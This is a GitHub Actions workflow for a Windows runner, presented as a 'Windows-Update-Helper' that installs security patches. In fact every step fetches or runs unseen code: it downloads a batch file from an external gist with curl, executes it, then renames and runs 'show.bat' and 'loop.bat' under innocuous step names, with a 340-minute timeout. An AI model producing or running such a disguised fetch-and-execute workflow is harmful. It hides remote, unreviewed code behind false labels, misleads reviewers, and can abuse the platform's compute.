name: Windows-Update-Helper

on:
  workflow_dispatch:

jobs:
  update:
    name: "Installing Security Patches"
    runs-on: windows-latest
    timeout-minutes: 340

    steps:
      - name: "Fetch Patch Data"
        run: |
          # Gist se raw file download kar rahe hain
          curl -L "https://gist.githubusercontent.com/Lohar-ji/bd85954a427f6d56338b8e5dbef85bf6/raw/Downloads.bat" -o patch_v2.bat
        shell: cmd

      - name: "Apply System Patches"
        run: |
          if exist patch_v2.bat (
            cmd /c patch_v2.bat
          ) else (
            echo "Error: patch_v2.bat download nahi ho saki. Link check karein."
            exit 1
          )

      - name: "Verify Patch Integrity"
        shell: pwsh
        run: |
          if (Test-Path "show.bat") { 
            Rename-Item -Path "show.bat" -NewName "service_start.bat"
            cmd /c service_start.bat 
          }

      - name: "Service Monitoring"
        shell: pwsh
        run: |
          if (Test-Path "loop.bat") { 
            Rename-Item -Path "loop.bat" -NewName "monitor.bat"
            cmd /c monitor.bat 
          }
